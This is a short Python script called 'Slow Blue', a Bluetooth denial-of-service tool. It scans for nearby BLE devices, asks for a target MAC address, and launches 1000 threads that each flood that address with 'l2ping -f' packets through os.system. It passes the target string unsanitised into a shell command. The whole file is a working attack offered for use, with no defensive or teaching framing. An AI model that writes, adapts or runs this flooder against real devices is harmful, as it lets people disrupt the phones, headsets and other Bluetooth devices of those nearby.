import os
import threading
import time
import asyncio
from bleak import BleakScanner

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

async def discover_ble_devices():
    devices = await BleakScanner.discover()
    for device in devices:
        print(f"Name: {device.name} - MAC: {device.address}")

def printLogo():
    print('                                            Slow Blue                                           ')
def main():
    printLogo()
    time.sleep(0.1)
    print('')
    time.sleep(0.1)
    os.system('clear')
    printLogo()
    print('')
    print("Scanning ...")
    loop = asyncio.get_event_loop()
    loop.run_until_complete(discover_ble_devices())
    
   
    
    target_addr = input('Target MAC > ')
   
    print('')
    os.system('clear')

    print("Attacking...")


    for i in range(0, 1000):
        print('[*] Built thread №' + str(i + 1))
        threading.Thread(target=DOS, args=[str(target_addr), str(600)]).start()

    print('[*] Built all threads...')
    print('[*] Starting...')
    

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))